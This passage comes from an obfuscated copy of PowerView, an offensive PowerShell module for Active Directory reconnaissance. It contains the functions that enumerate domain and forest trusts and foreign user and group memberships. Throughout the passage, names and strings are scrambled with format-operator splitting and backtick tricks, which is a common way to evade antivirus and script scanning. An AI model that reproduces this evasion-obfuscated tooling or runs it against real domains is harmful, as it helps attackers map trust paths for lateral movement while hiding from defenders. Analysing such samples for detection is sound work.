            [uint32]("{1}{2}{0}"-f '00008','0x00','0') = ("{4}{1}{2}{3}{5}{0}" -f 'E','RES','T_TRA','NSI','FO','TIV')
            [uint32]("{3}{0}{1}{2}" -f '00','0','0010','0x0') = ("{2}{4}{1}{0}{3}" -f '_ORGANI','SS','C','ZATION','RO')
            [uint32]("{0}{1}{2}"-f'0x00','0','00020') = ("{2}{3}{4}{1}{0}"-f 'T','RES','WIT','HI','N_FO')
            [uint32]("{1}{2}{0}"-f'040','0x00','000') = ("{1}{4}{0}{5}{3}{2}"-f 'AT','TR','EXTERNAL','_','E','_AS')
            [uint32]("{2}{0}{1}" -f'000','80','0x000') = ("{3}{1}{2}{5}{0}{7}{6}{4}"-f 'ENC','SES','_RC4','TRUST_U','ION','_','T','RYP')
            [uint32]("{0}{1}{2}"-f '0','x0000010','0') = ("{4}{3}{5}{0}{1}{2}"-f 'US','ES_','AES_KEYS','US','TR','T_')
            [uint32]("{1}{0}{2}"-f '0000','0x0','200') = ("{0}{3}{2}{5}{4}{1}{6}"-f 'C','L','NIZATIO','ROSS_ORGA','GT_DE','N_NO_T','EGATION')
            [uint32]("{1}{0}{2}"-f '4','0x00000','00') = ("{1}{0}{2}"-f 'M_T','PI','RUST')
        }

        ${ldAPs`eArCh`ErARgUMe`NTs} = @{}
        if (${P`sBOunDPA`R`AM`ETers}[("{0}{1}{2}"-f 'Doma','i','n')]) { ${LD`APSEarChera`R`Gum`En`Ts}[("{1}{0}"-f 'in','Doma')] = ${D`om`AIN} }
        if (${pSbOUN`Dpa`R`A`METe`RS}[("{1}{0}{2}" -f'DAPFilt','L','er')]) { ${Ld`A`pSE`A`RcHeRa`RgUmeNtS}[("{0}{3}{2}{1}" -f 'LDAPFil','r','e','t')] = ${LD`Ap`FiLTEr} }
        if (${P`SBOunDPA`R`AMet`ErS}[("{2}{1}{0}" -f 's','tie','Proper')]) { ${l`DaPS`ea`RCh`ERarGUM`eN`TS}[("{0}{1}{2}"-f'Pr','opertie','s')] = ${p`RoPE`Rt`IES} }
        if (${PsbO`Un`dPARa`M`EteRS}[("{1}{2}{0}"-f 'ase','S','earchB')]) { ${lDapseA`R`cHE`RARguMen`Ts}[("{1}{0}{2}" -f'hBas','Searc','e')] = ${sEARC`Hba`SE} }
        if (${PsbOUNDpARa`m`E`TE`RS}[("{0}{1}"-f'S','erver')]) { ${LDaPs`E`ARcherar`GUme`NTS}[("{1}{0}" -f'r','Serve')] = ${SEr`VER} }
        if (${PSBoUnd`p`AR`A`M`ETErS}[("{0}{2}{1}" -f 'S','e','earchScop')]) { ${Ld`A`PsEAR`cHeRA`RG`U`mENTS}[("{2}{0}{1}"-f'ch','Scope','Sear')] = ${S`eARcH`scopE} }
        if (${PSBOund`PaR`A`metE`RS}[("{1}{4}{2}{0}{3}"-f 'S','Re','ge','ize','sultPa')]) { ${L`DapSearCH`Er`ARG`UME`N`TS}[("{0}{1}{3}{2}{4}" -f 'ResultPa','geS','z','i','e')] = ${Re`sulTP`AgEsi`ZE} }
        if (${PSBoU`Ndp`A`RAmETErS}[("{2}{3}{4}{0}{1}" -f 'meL','imit','Ser','ver','Ti')]) { ${ld`Ap`sEa`R`cheRA`Rg`UmENts}[("{1}{2}{0}"-f 'mit','ServerTim','eLi')] = ${SeRvERTi`Mel`iM`It} }
        if (${Psbou`NdP`Aram`eTE`RS}[("{0}{1}{2}" -f'Tombsto','n','e')]) { ${LDaPsEa`RChE`R`ARgUm`e`NTS}[("{1}{2}{0}"-f'tone','Tomb','s')] = ${tOmBS`T`one} }
        if (${PSbo`UnDPArAM`eTe`RS}[("{2}{0}{1}" -f 'edentia','l','Cr')]) { ${ld`ApseArcHERa`RG`UMeN`TS}[("{0}{2}{1}" -f'Cred','tial','en')] = ${c`RE`DE`NTiAL} }
    }

    PROCESS {
        if (${PS`CMDL`et}.PaRamETERseTNAME -ne 'API') {
            ${NEtsE`AR`CH`era`R`GumEnts} = @{}
            if (${DomA`in} -and ${do`maIn}.("{0}{1}" -f'Tr','im').Invoke() -ne '') {
                ${sO`U`RCE`dom`Ain} = ${do`main}
            }
            else {
                if (${psB`Ou`ND`Pa`Ra`MeTeRs}[("{3}{0}{2}{1}"-f'ede','al','nti','Cr')]) {
                    ${S`OURc`edomA`In} = (&("{1}{0}{2}" -f 'mai','Get-Do','n') -Credential ${C`ReDeNT`iAL})."N`AME"
                }
                else {
                    ${so`U`RcE`domAiN} = (&("{0}{3}{2}{1}"-f 'Get-','ain','m','Do'))."N`AmE"
                }
            }
        }
        elseif (${psCm`dl`ET}.pArAMETerSetNamE -ne 'NET') {
            if (${dOM`A`iN} -and ${DoM`A`iN}.("{1}{0}"-f 'rim','T').Invoke() -ne '') {
                ${sO`UrC`E`DomAIN} = ${d`OmAiN}
            }
            else {
                ${soU`RCe`dom`AIN} = ${ENV:U`s`erDn`sdoMAIn}
            }
        }

        if (${p`s`cMd`LET}.paRaMetErSEtName -eq ("{0}{1}" -f'LD','AP')) {
            
            ${trUs`Ts`eaR`cher} = &("{3}{0}{2}{1}"-f'DomainSe','rcher','a','Get-') @LdapSearcherArguments
            ${SO`Ur`CE`sID} = &("{3}{0}{1}{2}"-f'-Dom','a','inSID','Get') @NetSearcherArguments

            if (${TRUs`T`SEarcH`eR}) {

                ${tr`U`stsE`AR`CHEr}."FilT`ER" = (("{6}{3}{1}{5}{2}{0}{4}" -f'stedDo','s=','ru','ectClas','main)','t','(obj'))

                if (${PSbouNdP`ArAME`TE`RS}[("{0}{1}" -f 'Fi','ndOne')]) { ${rESu`L`TS} = ${TrUstSe`A`Rch`er}.("{2}{1}{0}"-f'ne','indO','F').Invoke() }
                else { ${r`esU`lTS} = ${TRuS`T`SeARc`hEr}.("{0}{1}{2}" -f'F','indAl','l').Invoke() }
                ${R`eSuL`TS} | &("{2}{0}{1}"-f'-Obj','ect','Where') {${_}} | &("{1}{0}{3}{2}"-f'ch-','ForEa','bject','O') {
                    ${PR`O`PS} = ${_}."pr`opE`RTieS"
                    ${doma`i`N`TRUsT} = &("{1}{0}{2}"-f'w','Ne','-Object') ("{1}{2}{0}"-f 't','PSO','bjec')

                    ${TruStAT`TR`ib} = @()
                    ${TrUsT`A`T`TrIB} += ${tRusTat`Tr`Ibu`TEs}."K`EYs" | &("{3}{2}{0}{1}"-f 'c','t','Obje','Where-') { ${P`R`OpS}."trU`staTTR`ibu`TEs"[0] -band ${_} } | &("{2}{3}{1}{0}" -f'bject','ach-O','For','E') { ${tRU`STA`T`TriBu`TEs}[${_}] }

                    ${D`IREC`TIoN} = Switch (${pR`Ops}."TRUstdi`REC`T`i`ON") {
                        0 { ("{0}{2}{1}"-f'Di','led','sab') }
                        1 { ("{1}{0}" -f'nbound','I') }
                        2 { ("{0}{1}{2}" -f 'O','utb','ound') }
                        3 { ("{1}{4}{2}{3}{0}" -f 'l','Bidire','i','ona','ct') }
                    }

                    ${tRus`T`Type} = Switch (${P`RoPs}."tRUSTT`YPE") {
                        1 { ("{2}{1}{4}{3}{5}{6}{0}"-f 'TORY','WS_NO','WINDO','ACT','N_','IV','E_DIREC') }
                        2 { ("{6}{0}{5}{3}{1}{4}{2}"-f 'ACT','DI','TORY','VE_','REC','I','WINDOWS_') }
                        3 { 'MIT' }
                    }

                    ${DIS`T`inGUiSHeDn`A`mE} = ${pr`opS}."dIs`TiNGuisheDN`A`Me"[0]
                    ${sO`U`RC`E`NaMeiNdEX} = ${DISTINgU`Is`H`EDn`A`mE}.("{0}{2}{1}" -f'Ind','Of','ex').Invoke('DC=')
                    if (${sO`URc`ENA`M`EInd`Ex}) {
                        ${SOU`RcEdo`maiN} = $(${d`iST`IN`guIsh`EDNa`Me}.("{3}{1}{2}{0}"-f 'ng','u','bStri','S').Invoke(${SOUrCENAme`iN`dex})) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        ${S`our`cedo`maiN} = ""
                    }

                    ${t`A`Rge`T`NaMeInD`Ex} = ${disTIN`Gu`iSh`ED`NAMe}.("{0}{1}{2}" -f'Ind','exO','f').Invoke(("{0}{1}{2}" -f',','C','N=System'))
                    if (${souRcEnamei`ND`EX}) {
                        ${t`A`RgEtDOMaIN} = ${D`I`s`TINGUISHeDna`mE}.("{2}{1}{0}"-f 'ng','tri','SubS').Invoke(3, ${t`ARGe`TNaM`EIn`Dex}-3)
                    }
                    else {
                        ${ta`Rg`etdOMA`In} = ""
                    }

                    ${Ob`JeC`TGUiD} = &("{0}{2}{1}"-f 'Ne','-Object','w') ("{1}{0}" -f 'id','Gu') @(,${p`R`OPS}."O`BjeCTg`UID"[0])
                    ${tAR`Gets`iD} = (&("{2}{1}{0}"-f't','c','New-Obje') ("{1}{9}{7}{4}{8}{0}{6}{10}{3}{2}{5}"-f 'Secu','System.S','ntifie','de','pa','r','rity','ty.Princi','l.','ecuri','I')(${P`RoPs}."sECUrI`T`YiDen`TI`F`iER"[0],0))."vA`LuE"

                    ${D`OMa`inTr`UsT} | &("{0}{1}{2}" -f 'A','dd-','Member') ("{0}{1}{2}"-f'Not','epr','operty') ("{2}{1}{0}" -f 'e','urceNam','So') ${S`Ou`R`C`edOmAIn}
                    ${D`O`MAiN`Trust} | &("{2}{1}{0}"-f'ember','d-M','Ad') ("{0}{2}{1}{3}" -f 'Note','ro','p','perty') ("{2}{0}{1}" -f 'arg','etName','T') ${Pr`O`ps}."n`AMe"[0]
                    
                    ${dO`ma`iNTRUST} | &("{0}{1}{2}" -f'Add-','M','ember') ("{1}{2}{0}" -f'rty','N','oteprope') ("{1}{2}{0}"-f 'e','Tr','ustTyp') ${TR`UStT`y`pe}
                    ${d`omAint`RU`st} | &("{2}{3}{1}{0}" -f 'ember','M','A','dd-') ("{0}{2}{1}"-f'No','erty','teprop') ("{3}{1}{4}{0}{2}" -f'ibut','ust','es','Tr','Attr') $(${t`R`U`StATtriB} -join ',')
                    ${DOm`AiNT`RusT} | &("{2}{0}{1}"-f 'mbe','r','Add-Me') ("{1}{2}{3}{0}"-f 'rty','Notep','ro','pe') ("{0}{3}{1}{2}"-f'TrustDi','i','on','rect') "$Direction"
                    ${Doma`I`NtRUST} | &("{0}{1}{2}" -f'Add-Memb','e','r') ("{1}{3}{2}{0}" -f'ty','Notepr','r','ope') ("{1}{0}{2}"-f'ate','WhenCre','d') ${pR`OPs}."WhEN`c`ReAT`ED"[0]
                    ${do`MAi`NTRu`ST} | &("{1}{0}{2}"-f 'mb','Add-Me','er') ("{3}{1}{0}{2}" -f 'e','p','rty','Notepro') ("{0}{1}{3}{2}" -f'W','h','ged','enChan') ${PRO`PS}."whEncHA`NG`Ed"[0]
                    ${DOMaINt`RU`sT}."pSO`BJ`ect"."TyPe`Nam`ES".("{0}{1}"-f'I','nsert').Invoke(0, ("{4}{2}{0}{3}{1}" -f'ust','DAP','rView.DomainTr','.L','Powe'))
                    ${D`oMaInTR`Ust}
                }
                if (${RES`UL`Ts}) {
                    try { ${RE`Su`ltS}.("{0}{1}" -f 'di','spose').Invoke() }
                    catch {
                        &("{1}{0}{3}{2}"-f '-Ver','Write','se','bo') ('[Ge'+'t-D'+'omain'+'Trus'+'t] '+'E'+'rror'+' '+'d'+'is'+'posi'+'ng '+'of'+' '+'th'+'e '+'Res'+'ul'+'ts '+'objec'+'t: '+"$_")
                    }
                }
                ${t`RUsT`S`eaRch`er}.("{2}{1}{0}" -f 'spose','i','d').Invoke()
            }
        }
        elseif (${PsCMD`LET}.PArameTeRSeTnAme -eq 'API') {
            
            if (${PSboUN`d`pA`RaMET`ers}[("{0}{1}" -f'Ser','ver')]) {
                ${T`ARge`Tdc} = ${se`RV`ER}
            }
            elseif (${dO`M`AIn} -and ${dOM`A`In}.("{1}{0}"-f 'im','Tr').Invoke() -ne '') {
                ${taRgE`T`dC} = ${d`OmAIN}
            }
            else {
                
                ${tar`gE`Tdc} = ${NU`ll}
            }

            
            ${PTr`IN`Fo} =   $Nfv::"Z`ERo"

            
            ${f`lAGs} = 63
            ${dOMa`In`C`oUNT} = 0

            
            ${Res`U`lT} = ${N`e`TaPi32}::"dsENU`MErA`TEdo`M`A`INtrUSTs"(${TAr`GeT`dc}, ${F`laGs}, [ref]${p`Tr`iNfo}, [ref]${DomAin`C`OU`Nt})

            
            ${OF`F`sEt} = ${PT`Rin`FO}.("{1}{0}{2}"-f'n','ToI','t64').Invoke()

            
            if ((${R`ESu`LT} -eq 0) -and (${oF`FS`Et} -gt 0)) {

                
                ${iN`Crem`ENt} = ${D`S`_do`MAIn`_TrUsTs}::("{1}{0}{2}" -f 'Si','Get','ze').Invoke()

                
                for (${i} = 0; (${i} -lt ${Dom`AI`NcOUNt}); ${i}++) {
                    
                    ${ne`w`IN`TpTR} = &("{2}{1}{0}{3}"-f'bj','-O','New','ect') ("{0}{2}{4}{1}{3}" -f'Syste','In','m','tptr','.') -ArgumentList ${OFF`sET}
                    ${I`NFO} = ${nEWIn`TP`Tr} -as ${DS_D`OmA`IN`_T`RuS`TS}

                    ${o`FF`SET} = ${Ne`wI`NTPTR}.("{0}{2}{1}" -f 'ToI','64','nt').Invoke()
                    ${O`FfS`ET} += ${i`N`CREMeNT}

                    ${sidS`T`RING} = ''
                    ${rE`SULT} = ${adV`Ap`i32}::"co`NveR`TsiD`TOst`Rin`GSId"(${i`Nfo}."DOM`A`InsiD", [ref]${S`IdStR`INg});${Last`eRR`or} =   $NRQ::("{1}{2}{0}{3}" -f'32E','Get','LastWin','rror').Invoke()

                    if (${r`Esu`lt} -eq 0) {
                        &("{0}{3}{2}{1}"-f 'Wri','ose','b','te-Ver') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                    }
                    else {
                        ${DoM`A`INt`RUsT} = &("{0}{2}{1}" -f'New-O','ject','b') ("{0}{1}{2}"-f 'PSObj','e','ct')
                        ${dO`m`AiNTR`Ust} | &("{1}{0}{2}"-f 'dd-Mem','A','ber') ("{1}{0}{2}" -f'otepropert','N','y') ("{0}{1}{2}"-f'S','ource','Name') ${SOu`RC`eDo`Main}
                        ${doM`Ai`N`TRust} | &("{2}{1}{0}"-f'mber','-Me','Add') ("{2}{1}{0}" -f'operty','pr','Note') ("{3}{1}{0}{2}"-f 'g','r','etName','Ta') ${iN`FO}."D`NSDOm`A`InNAmE"
                        ${d`o`ma`iNtruST} | &("{0}{2}{1}" -f'Add-','ber','Mem') ("{3}{0}{1}{2}" -f 'tepr','o','perty','No') ("{3}{1}{0}{4}{2}{5}" -f 'tbi','Ne','sN','Target','o','ame') ${i`NFO}."nETb`IoS`dOmAI`N`Na`Me"
                        ${D`OMAINtR`UsT} | &("{1}{2}{0}"-f 'r','Ad','d-Membe') ("{2}{1}{3}{0}" -f'perty','otepr','N','o') ("{0}{1}"-f 'Flag','s') ${I`NfO}."FLa`gs"
                        ${doMa`i`NTruSt} | &("{1}{3}{2}{0}" -f'r','Add','embe','-M') ("{0}{2}{1}"-f'No','perty','tepro') ("{2}{1}{0}"-f'ex','Ind','Parent') ${IN`FO}."Parent`In`D`EX"
                        ${do`mA`INtrust} | &("{2}{1}{0}" -f 'er','d-Memb','Ad') ("{0}{1}{2}"-f'No','tep','roperty') ("{0}{2}{1}" -f 'Tr','stType','u') ${iN`FO}."T`RU`stTYpE"
                        ${d`oM`AintRu`St} | &("{3}{1}{0}{2}"-f 'Mem','dd-','ber','A') ("{2}{0}{1}" -f'pro','perty','Note') ("{2}{0}{1}{4}{3}"-f'us','tA','Tr','s','ttribute') ${I`NFo}."t`RuS`TAtTRIBuTES"
                        ${d`Oma`IntR`UsT} | &("{0}{3}{2}{1}" -f 'A','-Member','d','d') ("{0}{1}{2}{3}" -f'No','teprope','rt','y') ("{0}{2}{1}"-f'T','id','argetS') ${siD`S`TRi`NG}
                        ${d`o`maiNT`RusT} | &("{2}{0}{1}" -f 'dd-Membe','r','A') ("{3}{2}{0}{1}"-f'r','ty','oteprope','N') ("{0}{1}{2}" -f'Target','G','uid') ${i`NfO}."dO`mA`iNguId"
                        ${D`oMAINTRU`sT}."P`SOBjE`CT"."T`ypENaM`ES".("{1}{2}{0}"-f 't','Inse','r').Invoke(0, ("{3}{4}{2}{7}{0}{5}{1}{6}"-f'omai','s','iew','Po','werV','nTru','t.API','.D'))
                        ${D`O`ma`inTrUST}
                    }
                }
                
                ${n`Ull} = ${n`eTaP`i`32}::("{0}{2}{3}{1}" -f'NetA','Free','piBuffe','r').Invoke(${pT`R`INfo})
            }
            else {
                &("{2}{1}{0}{3}" -f'ite-Verbos','r','W','e') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
        else {
            
            ${foU`N`D`dOMain} = &("{0}{1}{2}" -f'Get-D','omai','n') @NetSearcherArguments
            if (${fO`Un`dD`omaIn}) {
                ${founddO`m`Ain}.("{3}{1}{2}{0}{6}{4}{5}"-f'h','t','ions','GetAllTrustRela','p','s','i').Invoke() | &("{2}{4}{1}{0}{3}"-f'j','b','ForEach','ect','-O') {
                    ${_}."P`S`oBjeCt"."t`YP`ENAmeS".("{1}{0}" -f'sert','In').Invoke(0, ("{2}{3}{4}{0}{1}"-f 'nTrust.N','ET','P','owerVie','w.Domai'))
                    ${_}
                }
            }
        }
    }
}


function G`eT-FOrestT`R`USt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{4}{0}{2}" -f'houldPr','S','ocess','P','S'}, '')]
    [OutputType({"{4}{5}{3}{6}{2}{1}{7}{0}"-f 'T','.','st','tTr','PowerV','iew.Fores','u','NE'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSitION = 0, vAluEFRomPipeLINE = ${T`RuE}, valuefromPIPeLInebYprOpERtYnaMe = ${t`RUE})]
        [Alias({"{0}{1}"-f 'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`ORE`St},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`E`dENTI`Al} =   $21GV7e::"E`MPtY"
    )

    PROCESS {
        ${n`E`TFORESTa`RGU`MEnts} = @{}
        if (${p`s`B`oUndPA`R`AMETeRS}[("{1}{0}" -f'rest','Fo')]) { ${NetFOResTA`Rg`Um`eNts}[("{1}{0}"-f 't','Fores')] = ${F`or`EsT} }
        if (${Psb`o`UnDPa`RA`ME`TERS}[("{0}{2}{1}" -f'Cr','al','edenti')]) { ${NE`TfOR`E`S`TaRGuMe`NTS}[("{1}{0}{2}" -f'i','Credent','al')] = ${cre`dENt`IAl} }

        ${f`O`UNdFOR`est} = &("{0}{1}{2}" -f 'Ge','t','-Forest') @NetForestArguments

        if (${fo`UND`F`OrEST}) {
            ${FO`UnDFO`REST}.("{3}{5}{2}{0}{1}{4}"-f 'lTrus','tRe','Al','Ge','lationships','t').Invoke() | &("{1}{2}{0}" -f 'ect','For','Each-Obj') {
                ${_}."Ps`obj`EcT"."t`Yp`eNamEs".("{0}{1}" -f'In','sert').Invoke(0, ("{2}{6}{5}{0}{1}{4}{3}" -f 'ores','tT','Powe','NET','rust.','View.F','r'))
                ${_}
            }
        }
    }
}


function G`Et`-dOmAiNFoR`eig`NUS`er {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{1}{4}"-f'ho','ldPr','PSS','u','ocess'}, '')]
    [OutputType({"{0}{2}{3}{1}"-f 'PowerView.','eignUser','F','or'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSITIOn = 0, vALUeFROMpipeLINE = ${T`RUe}, ValuEfRomPipELinebyPROpErTyNaMe = ${tr`Ue})]
        [Alias({"{0}{1}" -f 'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOMA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'lte','Fi','r'})]
        [String]
        ${lDA`pFi`lter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pROp`e`RTIeS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'Path','ADS'})]
        [String]
        ${S`EARC`hBA`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{2}{4}{1}" -f 'inCont','er','ro','Doma','ll'})]
        [String]
        ${S`ERVER},

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{2}{0}{1}" -f 'eve','l','OneL'}, {"{0}{1}"-f'Subtr','ee'})]
        [String]
        ${S`EArChScO`PE} = ("{0}{1}{2}"-f 'S','ubtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rES`ULtPA`gES`ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SerVer`T`ImeL`IMIt},

        [ValidateSet({"{0}{1}"-f'Da','cl'}, {"{1}{0}" -f 'p','Grou'}, {"{0}{1}" -f 'Non','e'}, {"{1}{0}"-f'r','Owne'}, {"{0}{1}" -f 'S','acl'})]
        [String]
        ${s`ecuriTY`m`ASkS},

        [Switch]
        ${To`M`BstonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${credeN`TI`AL} =   (ItEM variAblE:21gv7e ).valUE::"e`mptY"
    )

    BEGIN {
        ${SEaR`cHe`RaR`Gumen`TS} = @{}
        ${s`EarcH`E`R`ARGuMEnTs}[("{1}{0}{2}" -f 'Fil','LDAP','ter')] = ("{1}{0}{2}" -f 'embero','(m','f=*)')
        if (${PSBOU`NDPara`Me`Ters}[("{0}{1}" -f'Dom','ain')]) { ${s`EaRcH`ErArgumeN`Ts}[("{1}{0}{2}"-f'omai','D','n')] = ${DoM`AiN} }
        if (${PSbOund`p`ArA`Me`TErs}[("{1}{2}{0}"-f 'es','Proper','ti')]) { ${S`EaRc`HErARgum`ENTs}[("{3}{2}{1}{0}" -f'es','perti','o','Pr')] = ${pR`oP`ErTIes} }
        if (${Psb`OU`N`dpARAMET`eRs}[("{2}{0}{1}" -f'earchB','ase','S')]) { ${sEArC`h`Era`R`GUmeNTs}[("{1}{2}{0}{3}"-f 'a','Se','archB','se')] = ${SeAr`CHBa`se} }
        if (${PsBOUndparA`me`T`Ers}[("{0}{1}" -f 'Serve','r')]) { ${s`EaRc`H`eraRguM`e`NTs}[("{1}{2}{0}" -f'er','S','erv')] = ${Se`R`VEr} }
        if (${pSbO`Un`d`pARa`meterS}[("{0}{1}{3}{2}" -f 'S','e','chScope','ar')]) { ${se`Ar`c`hEraRgU`MeNTs}[("{2}{0}{3}{1}" -f'c','cope','Sear','hS')] = ${S`eaRcHsc`o`PE} }
        if (${PsbOunDpA`RA`M`EtERs}[("{1}{3}{0}{2}{4}"-f 'Page','Resu','Si','lt','ze')]) { ${sEa`R`cHe`R`ArGum`ENTs}[("{0}{2}{3}{1}" -f 'Res','eSize','ult','Pag')] = ${rESu`ltP`AGE`s`ize} }
        if (${ps`B`ounDpA`RAm`ETeRs}[("{1}{0}{3}{2}" -f'verTi','Ser','Limit','me')]) { ${SEA`RcHe`RArGUMe`NtS}[("{4}{2}{1}{0}{3}"-f 'TimeL','r','erve','imit','S')] = ${SE`R`VeRt`ImelIm`it} }
        if (${PSbO`U`N`d`ParamEtERS}[("{0}{2}{1}"-f 'Se','ks','curityMas')]) { ${seA`RChErAR`G`UM`ENtS}[("{3}{0}{1}{2}" -f 'ecuri','tyMask','s','S')] = ${SEcUritymA`s`ks} }
        if (${PsBoUn`DParAm`EtE`Rs}[("{2}{1}{0}" -f'ne','sto','Tomb')]) { ${SeaRC`HERArG`U`MeNTS}[("{1}{0}{2}" -f 'mbst','To','one')] = ${tOM`B`StonE} }
        if (${P`sbOUND`Pa`RAME`TeRS}[("{0}{1}{2}{3}" -f'Creden','ti','a','l')]) { ${S`E`ARcH`e`Ra`RGuMEntS}[("{0}{1}{2}" -f 'Cr','edent','ial')] = ${crEDeNT`I`AL} }
        if (${P`sBoUn`dPA`RA`meT`eRs}['Raw']) { ${se`ARchE`Ra`RGUmeNtS}['Raw'] = ${R`AW} }
    }

    PROCESS {
        &("{3}{4}{1}{0}{2}"-f 'e','s','r','G','et-DomainU') @SearcherArguments  | &("{2}{3}{1}{0}"-f 't','c','ForE','ach-Obje') {
            ForEach (${meMb`ErsH`Ip} in ${_}."MEmB`EroF") {
                ${iND`eX} = ${MeM`BEr`SH`IP}.("{2}{0}{1}"-f'dexO','f','In').Invoke('DC=')
                if (${I`Nd`Ex}) {

                    ${g`ROuPDoMA`iN} = $(${meMbEr`s`Hip}.("{1}{0}" -f'bString','Su').Invoke(${INd`EX})) -replace 'DC=','' -replace ',','.'
                    ${Use`R`DIst`IN`gUIS`hedName} = ${_}."DIStin`guIsh`edNA`me"
                    ${u`S`ErIn`dex} = ${uSerdIs`TingUISH`e`Dn`AME}.("{1}{0}" -f 'xOf','Inde').Invoke('DC=')
                    ${Use`RDO`maiN} = $(${_}."dIStinG`U`iSHEdn`AME".("{0}{2}{1}"-f 'SubS','ing','tr').Invoke(${U`SERInd`Ex})) -replace 'DC=','' -replace ',','.'

                    if (${GrOU`p`d`omAIn} -ne ${u`sEr`DOm`Ain}) {
                        
                        ${GRo`UPna`mE} = ${MemBe`Rs`Hip}.("{1}{0}"-f 'lit','Sp').Invoke(',')[0].("{0}{1}"-f 'spl','it').Invoke('=')[1]
                        ${FOR`eiGn`Us`Er} = &("{1}{2}{0}"-f'Object','New','-') ("{1}{2}{0}" -f't','PSObje','c')
                        ${F`oreIG`N`UseR} | &("{2}{0}{1}"-f'd-Membe','r','Ad') ("{3}{0}{2}{1}" -f 'e','perty','pro','Not') ("{1}{0}{2}" -f'serDomai','U','n') ${usEr`dOm`A`iN}
                        ${forE`IgnU`s`ER} | &("{0}{1}{2}" -f'Add','-','Member') ("{0}{1}{2}{3}"-f'Not','epr','op','erty') ("{1}{2}{0}"-f'ame','Use','rN') ${_}."SAMAC`cOUnt`N`A`mE"
                        ${fORE`ig`NUs`er} | &("{0}{2}{1}"-f'Add-','mber','Me') ("{3}{2}{0}{1}" -f'pert','y','epro','Not') ("{4}{0}{3}{2}{1}{5}"-f 'is','s','gui','tin','UserD','hedName') ${_}."DI`S`TINg`UIShED`NaME"
                        ${f`Or`eig`NusEr} | &("{2}{3}{0}{1}"-f '-Memb','er','A','dd') ("{1}{2}{0}{3}"-f'op','Notep','r','erty') ("{2}{3}{0}{1}"-f 'i','n','GroupDom','a') ${G`R`O`UpDOMAIn}
                        ${fOrei`gnu`s`er} | &("{1}{0}{2}" -f 'e','Add-M','mber') ("{0}{1}{2}" -f'N','oteprop','erty') ("{3}{1}{2}{0}"-f'e','o','upNam','Gr') ${gro`UpN`AMe}
                        ${F`O`Re`igNuser} | &("{2}{1}{0}" -f 'mber','-Me','Add') ("{2}{1}{0}{3}"-f'p','te','No','roperty') ("{0}{4}{1}{2}{3}"-f'GroupDi','tingu','ishedNa','me','s') ${MEm`BeRsh`iP}
                        ${F`o`R`eIGNUsEr}."pS`oBj`eCt"."TyPen`AM`Es".("{1}{0}" -f 'sert','In').Invoke(0, ("{1}{2}{4}{5}{6}{3}{0}" -f'ignUser','P','owe','Fore','rVie','w','.'))
                        ${FO`R`EiG`NUsEr}
                    }
                }
            }
        }
    }
}


function gEt-d`oMai`NfO`REigngRO`U`pmEmBer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{4}{2}" -f'PSShou','P','s','ld','roces'}, '')]
    [OutputType({"{2}{1}{4}{0}{5}{3}" -f'e','rView.ForeignGr','Powe','r','oupM','mbe'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTIon = 0, VaLUeFrompIpELine = ${t`RUE}, valUEfrOmPipelINEBYPrOpERTYNAmE = ${t`RUE})]
        [Alias({"{0}{1}" -f 'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`Oma`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Fil','ter'})]
        [String]
        ${LDApFi`lT`er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PR`oP`e`RtieS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f 'A','DSPa','th'})]
        [String]
        ${sE`AR`c`HbasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{2}"-f 't','roll','er','DomainCon'})]
        [String]
        ${S`Er`VEr},

        [ValidateSet({"{1}{0}"-f 'se','Ba'}, {"{1}{2}{0}"-f'l','One','Leve'}, {"{1}{0}"-f'e','Subtre'})]
        [String]
        ${sEAR`chsC`o`Pe} = ("{0}{1}" -f 'Su','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${resUl`Tp`Ag`E`SIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`e`RvE`Rtim`ELI`mIt},

        [ValidateSet({"{1}{0}"-f 'acl','D'}, {"{0}{1}"-f'Gr','oup'}, {"{1}{0}"-f'e','Non'}, {"{1}{0}" -f 'ner','Ow'}, {"{1}{0}"-f'acl','S'})]
        [String]
        ${sECU`RIt`Yma`S`ks},

        [Switch]
        ${tOm`BsT`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrE`D`Ent`ial} =  $21gV7E::"EmP`Ty"
    )

    BEGIN {
        ${sEARCheR`ArguMe`N`Ts} = @{}
        ${sE`ARCHeRArGU`M`e`N`Ts}[("{1}{2}{0}" -f'lter','LDAP','Fi')] = (("{1}{2}{0}" -f '=*)','(me','mber'))
        if (${psbOuN`d`Par`AMETE`RS}[("{1}{0}{2}" -f'oma','D','in')]) { ${s`eArc`Her`ARGu`mEnts}[("{1}{0}"-f 'in','Doma')] = ${doM`AIn} }
